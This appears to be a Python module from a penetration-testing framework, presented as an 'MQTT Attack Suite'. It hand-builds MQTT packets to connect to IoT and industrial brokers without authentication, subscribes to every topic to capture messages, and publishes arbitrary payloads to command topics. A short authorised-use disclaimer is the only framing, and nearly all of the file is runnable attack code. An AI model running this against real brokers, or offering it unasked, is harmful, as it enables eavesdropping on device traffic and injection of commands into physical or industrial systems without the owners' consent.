"""
MQTT Attack Suite — Unauthenticated broker exploitation.
MQTT port 1883 (cleartext), 8883 (TLS). Common in IoT, IIoT (Sparkplug B).
"""
# DISCLAIMER: FOR AUTHORIZED SECURITY RESEARCH AND PENETRATION TESTING ONLY.
# Use only on systems you own or have explicit written permission to test.
# Authorized use only. See embedxpl.core.exploit.DISCLAIMER for full text.

from __future__ import annotations
import logging, socket, struct, time
from dataclasses import dataclass, field

log = logging.getLogger(__name__)
MQTT_PORT = 1883

def _mqtt_connect(client_id: str = "xpl_scanner", clean: bool = True) -> bytes:
    cid = client_id.encode()
    proto = b"MQTT"; ver = 4; flags = 0x02 if clean else 0
    keepalive = 60
    payload = struct.pack(">H", len(cid)) + cid
    var_header = struct.pack(">H", len(proto)) + proto + bytes([ver, flags]) + struct.pack(">H", keepalive)
    remaining = len(var_header) + len(payload)
    return bytes([0x10, remaining]) + var_header + payload

def _mqtt_subscribe(topic: str, qos: int = 0, msg_id: int = 1) -> bytes:
    t = topic.encode(); payload = struct.pack(">H", len(t)) + t + bytes([qos])
    var = struct.pack(">H", msg_id); remaining = len(var) + len(payload)
    return bytes([0x82, remaining]) + var + payload

def _mqtt_publish(topic: str, payload: bytes, qos: int = 0) -> bytes:
    t = topic.encode()
    var = struct.pack(">H", len(t)) + t
    remaining = len(var) + len(payload)
    return bytes([0x30, remaining]) + var + payload

@dataclass
class MQTTResult:
    host: str = ""; connected: bool = False
    topics: list = field(default_factory=list)
    messages: list = field(default_factory=list)
    error: str = ""

class MQTTAttack:
    def __init__(self, host: str, port: int = MQTT_PORT, timeout: float = 10.0):
        self.host = host; self.port = port; self.timeout = timeout

    def connect(self) -> tuple[socket.socket, bool]:
        s = socket.create_connection((self.host, self.port), timeout=self.timeout)
        s.sendall(_mqtt_connect())
        resp = s.recv(4); connected = len(resp) >= 4 and resp[0] == 0x20 and resp[3] == 0
        return s, connected

    def wildcard_subscribe(self, duration_s: float = 5.0) -> MQTTResult:
        """Subscribe to # (all topics) without auth."""
        result = MQTTResult(host=self.host)
        try:
            s, ok = self.connect()
            result.connected = ok
            if not ok: result.error = "CONNACK refused"; return result
            s.sendall(_mqtt_subscribe("#"))
            end = time.time() + duration_s; s.settimeout(2.0)
            while time.time() < end:
                try:
                    hdr = s.recv(2)
                    if not hdr: break
                    if hdr[0] == 0x30:  # PUBLISH
                        length = hdr[1]; data = s.recv(length)
                        topic_len = struct.unpack_from(">H", data)[0]
                        topic = data[2:2+topic_len].decode(errors="replace")
                        msg = data[2+topic_len:].decode(errors="replace")
                        result.topics.append(topic)
                        result.messages.append({"topic": topic, "payload": msg[:100]})
                except socket.timeout: continue
                except Exception: break
            s.close()
        except Exception as exc: result.error = str(exc)
        return result

    def inject_command(self, topic: str, payload: str) -> bool:
        """Publish to a command topic without auth."""
        try:
            s, ok = self.connect()
            if not ok: return False
            s.sendall(_mqtt_publish(topic, payload.encode()))
            s.close(); return True
        except Exception: return False

if __name__ == "__main__":
    import sys, json
    host = sys.argv[1] if len(sys.argv) > 1 else "localhost"
    a = MQTTAttack(host)
    r = a.wildcard_subscribe(5.0)
    print(json.dumps({"connected": r.connected, "topics": r.topics[:10]}, indent=2))

